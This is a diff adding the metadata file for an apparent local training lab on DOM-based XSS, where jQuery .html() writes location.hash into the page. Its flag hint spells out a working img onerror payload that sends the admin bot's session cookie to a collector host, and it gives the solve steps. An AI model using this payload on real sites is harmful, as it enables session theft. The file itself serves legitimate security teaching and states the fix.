@@ -1,0 +1,43 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "dom-xss-innerhtml-jquery-html",
+  "title": "DOM XSS via jQuery .html() on location.hash",
+  "track": "xss",
+  "difficulty": "apprentice",
+  "estimated_minutes": 30,
+  "max_lifetime_minutes": 45,
+  "learning_objectives": [
+    "Identify a DOM-based XSS where a client-side router writes location.hash into the page with jQuery .html() (innerHTML)",
+    "Understand why innerHTML will not run a bare <script> but WILL run event-handler attributes on freshly parsed elements",
+    "Use <img src=x onerror=...> as the reliable innerHTML execution primitive",
+    "Read document.cookie from the victim's browser and exfiltrate the non-HttpOnly session to an OOB collector",
+    "See that the fix is .text() (or a sanitiser), never .html() on untrusted routing input"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["dom-xss-hash-document-write"],
+  "flag_hint": "Submit /#<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"> (URL-encoded) to POST /report; the admin bot's jQuery .html() runs it, exfiltrating its session cookie. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "jQuery 3.7.1 (.html() sink)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "dom-xss",
+    "jquery",
+    "innerhtml",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The jQuery .html() DOM-XSS pattern, abstracted for local Docker. Uses current jQuery 3.7.1 rather than the catalog's 3.4.1 — the taught flaw is the app's own .html(untrusted) misuse (identical across versions), and a non-CVE'd jQuery keeps the Trivy gate honest and avoids an unintended solve path."
+}
